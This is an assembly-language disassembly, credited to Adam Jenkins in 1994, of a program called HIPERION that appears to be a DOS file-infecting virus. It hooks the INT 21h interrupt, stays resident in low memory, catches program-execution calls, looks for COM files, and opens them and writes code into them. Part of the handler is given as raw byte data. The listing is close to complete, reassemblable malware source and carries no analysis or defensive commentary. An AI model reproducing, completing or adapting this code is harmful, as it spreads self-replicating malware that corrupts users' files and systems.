PAGE  59,132

;Disassembly by Adam Jenkins using Sourcer, 1994
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;                                      ;;
;;;                 HIPERION                     ;;
;;;                                      ;;
;;;      Created:   21-Dec-93                            ;;
;;;      Passes:    9          Analysis Options on: none             ;;
;;;                                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

data_1e     equ 5
data_2e     equ 1Ah
data_3e     equ 0CDh
data_4e     equ 0CEh
data_5e     equ 0FDh
data_6e     equ 0FFh

seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a


        org 100h

hiperion    proc    far

start::
        mov bp,offset loc_3
        jmp bp          ;*Register jump
        db  '................................'
        db  '................................'
        db  '................................'
        db  '............................'
        db  0CDh, 20h
loc_3::
        mov si,data_1e
loc_4::
        mov al,[bp+si+19h]
        nop
        mov ds:data_6e[si],al
        dec si
        jnz loc_4           ; Jump if not zero
        push    es
        push    ds
        call    sub_7
        pop ds
        pop es
        mov bp,offset start
        jmp bp          ;*Register jump
        jmp short loc_8
        db   2Eh, 2Eh, 2Eh, 90h, 9Ch, 50h
        db   80h,0FCh, 4Bh, 75h, 13h, 06h
        db   53h, 51h, 56h, 1Eh, 52h, 55h
        db   33h,0EDh,0E8h, 0Fh, 00h, 5Dh
        db   5Ah, 1Fh, 5Eh, 59h, 5Bh, 07h
        db   58h, 9Dh,0EAh, 92h, 14h, 69h
        db   05h, 90h
        db   0Eh, 07h,0E8h, 47h, 00h, 72h
        db   44h,0E8h, 61h, 00h, 72h, 3Fh
        db  0E8h, 72h, 00h, 05h, 00h, 01h
        db   2Eh, 89h, 86h,0CEh, 00h,0E8h
        db   5Dh, 00h
        db  0BAh, 1Ah, 00h, 03h,0D5h,0B9h
        db   05h, 00h,0B4h, 3Fh,0CDh, 21h
        db   2Eh, 80h, 7Eh, 1Ah,0BDh, 74h
        db   1Eh,0E8h, 47h, 00h
        db  0BAh,0CDh, 00h, 03h,0D5h,0B9h
        db   05h, 00h,0B4h, 40h,0CDh, 21h
        db  0E8h, 42h, 00h,0B9h,0FEh, 00h
        db   8Bh,0D5h,0B4h, 40h,0CDh, 21h
        db  0E8h, 1Bh, 00h

loc_ret_6::
        retn

hiperion    endp

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_2       proc    near
        push    bx
        mov bx,dx
loc_7::
        inc bx
        cmp byte ptr [bx],2Eh   ; '.'
        jne loc_7           ; Jump if not equal
        inc bx
        cmp byte ptr [bx],43h   ; 'C'
loc_8::
        je  loc_9           ; Jump if equal
        cmp byte ptr [bx],63h   ; 'c'
        je  loc_9           ; Jump if equal
        pop bx
        stc             ; Set carry flag
        retn
loc_9::
        pop bx
        clc             ; Clear carry flag
        retn
sub_2       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_3       proc    near
        mov ah,3Eh          ; '>'
        int 21h         ; DOS Services  ah=function 3Eh
                        ;  close file, bx=file handle
        retn
sub_3       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_4       proc    near
        mov ax,3D02h
        int 21h         ; DOS Services  ah=function 3Dh
                        ;  open file, al=mode,name@ds:dx
        pushf               ; Push flags
        mov bx,ax
        push    cs
        pop ds
        popf                ; Pop flags
        retn
sub_4       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_5       proc    near
        xor cx,cx           ; Zero register
        xor dx,dx           ; Zero register
        mov ax,4200h
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, bx=file handle
                        ;   al=method, cx,dx=offset
        retn
sub_5       endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_6       proc    near
        xor cx,cx           ; Zero register
        xor dx,dx           ; Zero register
        mov ax,4202h
        int 21h         ; DOS Services  ah=function 42h
                        ;  move file ptr, bx=file handle
                        ;   al=method, cx,dx=offset
        retn
sub_6       endp

        db  0BDh, 83h, 01h,0FFh,0E5h

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                  SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_7       proc    near
        mov ax,3521h
        int 21h         ; DOS Services  ah=function 35h
                        ;  get intrpt vector al in es:bx
        mov [bp+3Dh],bx
        mov ax,es
        cmp ax,60h
        je  loc_ret_11      ; Jump if equal
        mov [bp+3Fh],ax
        mov si,data_5e
        mov ax,60h
        mov ds,ax
loc_10::
        mov ah,cs:[bp+si]
        mov [si],ah
        dec si
        jge loc_10          ; Jump if > or =
;*      mov dx,offset loc_1     ;*
        db  0BAh, 1Fh, 00h
        mov ax,2521h
        int 21h         ; DOS Services  ah=function 25h
                        ;  set intrpt vector al to ds:dx

loc_ret_11::
        retn
sub_7       endp

        db  33h

seg_a       ends



        end start
